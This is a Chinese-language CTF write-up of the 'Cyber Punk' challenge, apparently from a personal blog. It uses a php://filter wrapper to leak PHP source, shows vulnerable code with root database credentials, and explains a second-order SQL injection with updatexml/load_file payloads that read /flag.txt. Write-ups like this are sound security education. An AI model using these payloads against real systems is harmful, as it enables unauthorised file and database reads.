# Cyber Punk


名字太有吸引力了。

  

&lt;!--more--&gt;

  
  

# ?file=?

  

网页越是花里胡哨越是去看源代码：

  

![?file=?](../post_pre/pics/cyberpunk/cp1.png)

  

以及其他php文件的名字：

  

![phps](../post_pre/pics/cyberpunk/cp3.png)

  
  

推测伪协议

  

`?file=php://filter/convert.base64-encode/resource=xxx.php`

  

所以就：

  

![cp2](../post_pre/pics/cyberpunk/cp2.png)

  

# phps

  

base64解码之后，除了HTML部分，就是一个php代码：

  

```php

//index.php

&lt;?php

//可以访问的文件目录

ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);

  

// $file = $_GET[&#34;file&#34;];

$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);

if (isset($file)){

    //如果file存在则进行检查一些敏感的文件操作关键字

    if (preg_match(&#34;/phar|zip|bzip2|zlib|data|input|%00/i&#34;,$file)) {

        echo(&#39;no way!&#39;);

        exit;

    }

    @include($file);

}

?&gt;

```

  

&lt;hr&gt;

  

```php

//change.php

&lt;?php

  

require_once &#34;config.php&#34;;

  

//检查post来的数据中，user_name、 address、 phone不为空

if(!empty($_POST[&#34;user_name&#34;]) &amp;&amp; !empty($_POST[&#34;address&#34;]) &amp;&amp; !empty($_POST[&#34;phone&#34;]))

{

    $msg = &#39;&#39;;

    //把基本的SQL注入关键字都列入黑名单了

    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;

    $user_name = $_POST[&#34;user_name&#34;];

    //对address进行addslashes过滤

    $address = addslashes($_POST[&#34;address&#34;]);

    $phone = $_POST[&#34;phone&#34;];

    //对user_name 和 phone把基本的SQL注入关键字都给过滤了。

    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){

        $msg = &#39;no sql inject!&#39;;

    }else{

        $sql = &#34;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&#34;;

        $fetch = $db-&gt;query($sql);

    }

  

    //如果查询结果中存在匹配的用户数据

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){

        $row = $fetch-&gt;fetch_assoc();

        //更新地址，并保存旧地址

        $sql = &#34;update `user` set `address`=&#39;&#34;.$address.&#34;&#39;, `old_address`=&#39;&#34;.$row[&#39;address&#39;].&#34;&#39; where `user_id`=&#34;.$row[&#39;user_id&#39;];

        $result = $db-&gt;query($sql);

        //检查更新是否成功

        if(!$result) {

            echo &#39;error&#39;;

            print_r($db-&gt;error);

            exit;

        }

        $msg = &#34;订单修改成功&#34;;

    } else {

        $msg = &#34;未找到订单!&#34;;

    }

}else {

    $msg = &#34;信息不全&#34;;

}

?&gt;

```

  

在这里的开头可以看见还有一个`config.php`，so：

  

&lt;hr&gt;

  

```php

//config.php

&lt;?php

  

ini_set(&#34;open_basedir&#34;, getcwd() . &#34;:/etc:/tmp&#34;);

  

$DATABASE = array(

  

    &#34;host&#34; =&gt; &#34;127.0.0.1&#34;,

    &#34;username&#34; =&gt; &#34;root&#34;,

    &#34;password&#34; =&gt; &#34;root&#34;,

    &#34;dbname&#34; =&gt;&#34;ctfusers&#34;

);

  

$db = new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABASE[&#39;password&#39;],$DATABASE[&#39;dbname&#39;]);

  

```

  

- `ini_set(&#34;open_basedir&#34;, getcwd() . &#34;:/etc:/tmp&#34;);`: 设置 open_basedir 配置选项，用于限制 PHP 脚本能够访问的文件路径范围。在这里，它被设置为当前工作目录 `(getcwd())`、`/etc` 目录和 `/tmp`目录。这样，PHP 脚本只能访问这些指定的路径，超出这些路径的访问将被限制。

  

- 数据库连接: 通过使用提供的数据库连接参数（主机、用户名、密码、数据库名），创建了一个 MySQLi 对象 `$db`，用于与 名为**ctfusers**`MySQL` 数据库建立连接。

  
  

# attack?

  

注意一下存在的sql语句，

  

```php

//...

$sql = &#34;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&#34;;

$fetch = $db-&gt;query($sql);

  

//...

  

$sql = &#34;update `user` set `address`=&#39;&#34;.$address.&#34;&#39;, `old_address`=&#39;&#34;.$row[&#39;address&#39;].&#34;&#39; where `user_id`=&#34;.$row[&#39;user_id&#39;];

$result = $db-&gt;query($sql);

```

  

上面一个没有上面可利用的，基本写死了，so，下面这一个。

  

- update地址，对update的内容进行addslashes检查——address会被转义，然后进行更新，也就是说单引号之类的无效了

- 旧地址`$row[&#39;address&#39;]`存入`old_address`，没有任何检查处理拼接到`$sql`中。

  

如果第一次修改地址的时候，构造一个含SQL语句特殊的payload，然后在第二次修改的时候随便更新一个正常的地址，那个之前没有触发SQL注入的payload就会被触发。

  

所以进行二次注入攻击。

  
  

[LOAD_FILE(filename](https://www.yiibai.com/mysql/mysql_function_load_file.html)

  

[updatexml](https://www.cnblogs.com/c1047509362/p/12806297.html)

  

&lt;hr&gt;

  

构造payload：

  

```sql

1&#39; or updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30))),1)#

1&#39; or updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),30,60))),1)#

```

  

[具体操作参考这个](https://blog.csdn.net/nigo134/article/details/119487058?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-119487058-blog-119929199.235%5Ev40%5Epc_relevant_3m_sort_dl_base4&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-119487058-blog-119929199.235%5Ev40%5Epc_relevant_3m_sort_dl_base4&amp;utm_relevant_index=2)


---

> Author:   
> URL: https://66lueflam144.github.io/posts/2ce1ec6/  

